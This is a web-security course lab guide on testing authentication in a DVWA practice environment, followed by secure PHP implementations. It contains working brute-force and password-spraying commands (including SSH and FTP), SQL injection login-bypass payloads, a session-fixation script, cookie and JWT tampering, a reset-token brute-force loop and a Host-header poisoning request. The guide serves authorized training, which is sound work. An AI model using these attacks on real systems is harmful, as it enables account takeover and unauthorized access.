# LAB-3.3.4: Testing Authentication Mechanisms

## Lab Overview

**Course:** BVWS103 – OWASP Top 10 Vulnerabilities & Exploitation Techniques  
**Lab Code:** LAB-3.3.4  
**Lab Title:** Testing Authentication Mechanisms  
**Duration:** 2-3 hours  
**Difficulty:** Intermediate  
**Objectives:** Identify and exploit authentication vulnerabilities including weak passwords, broken authentication, and session management flaws.

---

## ⚠️ ETHICAL WARNING

**ONLY test on authorized systems. Unauthorized access is illegal.**

---

## Lab Introduction

Authentication flaws are critical vulnerabilities that allow attackers to compromise user accounts and gain unauthorized access. This lab covers common authentication weaknesses and exploitation techniques.

### Learning Objectives

- Identify weak authentication mechanisms
- Exploit brute force vulnerabilities
- Bypass authentication controls
- Test password reset functionality
- Implement secure authentication

---

## Lab Setup

```bash
# Start DVWA
sudo docker run -d -p 80:80 vulnerables/web-dvwa

# Install tools
sudo apt install -y hydra medusa john hashcat

# Verify
hydra -h
john --version
```

---

## Part 1: Weak Password Testing (30 minutes)

### Exercise 1.1: Password Brute Force

**Task 1:** Brute force login with Hydra

```bash
# HTTP GET brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    localhost http-get-form \
    "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect"

# HTTP POST brute force
hydra -l admin -P passwords.txt \
    localhost http-post-form \
    "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# SSH brute force
hydra -l root -P passwords.txt ssh://192.168.1.100

# FTP brute force
hydra -l admin -P passwords.txt ftp://192.168.1.100

# Custom user and password lists
hydra -L users.txt -P passwords.txt \
    localhost http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"
```

**Common Weak Passwords:**
```
admin / admin
admin / password
root / root
admin / 123456
user / user
test / test
```

---

### Exercise 1.2: Password Spraying

**Task 2:** Test common passwords across multiple accounts

```bash
# Create user list
cat > users.txt << EOF
admin
administrator
root
user
test
demo
EOF

# Create common password list
cat > common_passwords.txt << EOF
Password123
Welcome123
Company2024
Spring2024
Summer2024
EOF

# Spray passwords (avoid account lockout)
for password in $(cat common_passwords.txt); do
    echo "Testing password: $password"
    hydra -L users.txt -p "$password" \
        localhost http-post-form "/login:user=^USER^&pass=^PASS^:F=failed" \
        -t 1 -w 30
    sleep 60  # Wait between attempts
done
```

---

## Part 2: Authentication Bypass (40 minutes)

### Exercise 2.1: SQL Injection Authentication Bypass

**Task 3:** Bypass login using SQL injection

```sql
-- Basic bypass
Username: admin' OR '1'='1
Password: anything

-- Comment out password check
Username: admin'--
Password: (empty)

-- Alternative syntax
Username: admin' #
Password: (empty)

-- Union-based bypass
Username: ' UNION SELECT 'admin','password'--
Password: password

-- Boolean-based bypass
Username: admin' OR 1=1--
Password: (empty)
```

**Testing in DVWA:**
```bash
# Navigate to Brute Force page
# Try SQL injection payloads
# Observe successful authentication
```

---

### Exercise 2.2: Session Fixation

**Task 4:** Exploit session fixation vulnerability

```html
<!-- Attacker sets session ID -->
<script>
document.cookie = "PHPSESSID=attacker_controlled_session";
window.location = "http://victim-site.com/login";
</script>

<!-- Victim logs in with fixed session -->
<!-- Attacker uses same session ID to access account -->
```

**Prevention:**
```php
<?php
// Regenerate session ID after login
session_start();
if (login_successful()) {
    session_regenerate_id(true);
}
?>
```

---

### Exercise 2.3: Cookie Manipulation

**Task 5:** Manipulate authentication cookies

```bash
# View cookies
curl -I http://localhost/dvwa/

# Decode base64 cookie
echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d

# Modify cookie
# Original: user=guest
# Modified: user=admin

# Send request with modified cookie
curl -b "user=admin" http://localhost/protected/

# JWT manipulation
# Decode JWT token
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d

# Modify claims
# Change "role":"user" to "role":"admin"

# Re-encode and send
```

---

## Part 3: Password Reset Vulnerabilities (30 minutes)

### Exercise 3.1: Password Reset Token Prediction

**Task 6:** Test password reset functionality

```bash
# Request password reset
curl -X POST http://localhost/reset_password \
    -d "email=victim@example.com"

# Analyze reset token
# Check if predictable (timestamp, sequential, weak random)

# Brute force reset token
for i in {1..10000}; do
    curl "http://localhost/reset?token=$i"
done

# Test token reuse
# Use same token multiple times

# Test token expiration
# Check if tokens expire

# Test account enumeration
# Different responses for valid/invalid emails
```

---

### Exercise 3.2: Password Reset Poisoning

**Task 7:** Exploit Host header injection

```bash
# Intercept password reset request
# Modify Host header

POST /reset_password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com

# Victim receives email with attacker's domain
# Reset link: http://attacker.com/reset?token=abc123
# Victim clicks, token sent to attacker
```

---

## Part 4: Multi-Factor Authentication Bypass (20 minutes)

### Exercise 4.1: MFA Bypass Techniques

**Task 8:** Test MFA implementation

```bash
# Test direct access after first factor
# Login with username/password
# Skip MFA page, go directly to dashboard

# Test response manipulation
# Intercept MFA verification response
# Change {"success":false} to {"success":true}

# Test code reuse
# Use same MFA code multiple times

# Test backup codes
# Brute force backup codes

# Test rate limiting
# Unlimited MFA code attempts
```

---

## Part 5: Secure Implementation (30 minutes)

### Exercise 5.1: Secure Password Storage

**Task 9:** Implement secure password hashing

```php
<?php
// INSECURE - Plain text
$password = $_POST['password'];
$query = "INSERT INTO users (password) VALUES ('$password')";

// INSECURE - MD5
$password = md5($_POST['password']);

// INSECURE - SHA1
$password = sha1($_POST['password']);

// SECURE - bcrypt
$password = password_hash($_POST['password'], PASSWORD_BCRYPT, ['cost' => 12]);

// Verification
if (password_verify($_POST['password'], $stored_hash)) {
    // Login successful
}

// SECURE - Argon2
$password = password_hash($_POST['password'], PASSWORD_ARGON2ID);
?>
```

---

### Exercise 5.2: Secure Authentication Implementation

**Task 10:** Implement secure login system

```php
<?php
session_start();

// Rate limiting
$max_attempts = 5;
$lockout_time = 900; // 15 minutes

if ($_SESSION['login_attempts'] >= $max_attempts) {
    if (time() - $_SESSION['last_attempt'] < $lockout_time) {
        die('Account temporarily locked');
    } else {
        $_SESSION['login_attempts'] = 0;
    }
}

// Secure password verification
$username = $_POST['username'];
$password = $_POST['password'];

$stmt = $pdo->prepare("SELECT id, password FROM users WHERE username = ?");
$stmt->execute([$username]);
$user = $stmt->fetch();

if ($user && password_verify($password, $user['password'])) {
    // Regenerate session ID
    session_regenerate_id(true);
    
    // Set session variables
    $_SESSION['user_id'] = $user['id'];
    $_SESSION['username'] = $username;
    $_SESSION['login_time'] = time();
    
    // Reset login attempts
    $_SESSION['login_attempts'] = 0;
    
    // Secure cookie settings
    session_set_cookie_params([
        'lifetime' => 3600,
        'path' => '/',
        'domain' => 'example.com',
        'secure' => true,
        'httponly' => true,
        'samesite' => 'Strict'
    ]);
    
    // Log successful login
    log_event('login_success', $user['id']);
    
    header('Location: dashboard.php');
} else {
    // Increment failed attempts
    $_SESSION['login_attempts']++;
    $_SESSION['last_attempt'] = time();
    
    // Log failed attempt
    log_event('login_failed', $username);
    
    // Generic error message
    $error = 'Invalid credentials';
}
?>
```

---

### Exercise 5.3: Secure Password Reset

**Task 11:** Implement secure password reset

```php
<?php
// Generate secure token
$token = bin2hex(random_bytes(32));
$expiry = time() + 3600; // 1 hour

// Store token in database
$stmt = $pdo->prepare("INSERT INTO password_resets (email, token, expiry) VALUES (?, ?, ?)");
$stmt->execute([$email, hash('sha256', $token), $expiry]);

// Send email with token
$reset_link = "https://example.com/reset?token=$token";
mail($email, "Password Reset", "Click here: $reset_link");

// Verify token
$token = $_GET['token'];
$hashed_token = hash('sha256', $token);

$stmt = $pdo->prepare("SELECT email FROM password_resets WHERE token = ? AND expiry > ? AND used = 0");
$stmt->execute([$hashed_token, time()]);
$reset = $stmt->fetch();

if ($reset) {
    // Allow password reset
    // Mark token as used
    $stmt = $pdo->prepare("UPDATE password_resets SET used = 1 WHERE token = ?");
    $stmt->execute([$hashed_token]);
} else {
    die('Invalid or expired token');
}
?>
```

---

## Lab Challenge

**Scenario:** Audit authentication system

**Tasks:**
1. Test for weak passwords
2. Attempt authentication bypass
3. Test password reset functionality
4. Test MFA implementation
5. Document findings
6. Provide remediation recommendations

---

## Verification Checklist

- [ ] Can identify weak passwords
- [ ] Can perform brute force attacks
- [ ] Can bypass authentication
- [ ] Can exploit password reset
- [ ] Can implement secure authentication

---

## Cleanup

```bash
sudo docker stop $(sudo docker ps -q --filter ancestor=vulnerables/web-dvwa)
```

---

## Submission Requirements

1. **Lab Report** with findings
2. **Proof-of-Concept** exploits
3. **Secure Code** examples
4. **Reflection** (300-400 words)

---

## Additional Resources

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)

---

**Lab Version:** 1.0  
**Last Updated:** November 2025  
**Instructor Contact:** resources@aivtic.org.ng

---

**End of Lab Guide**
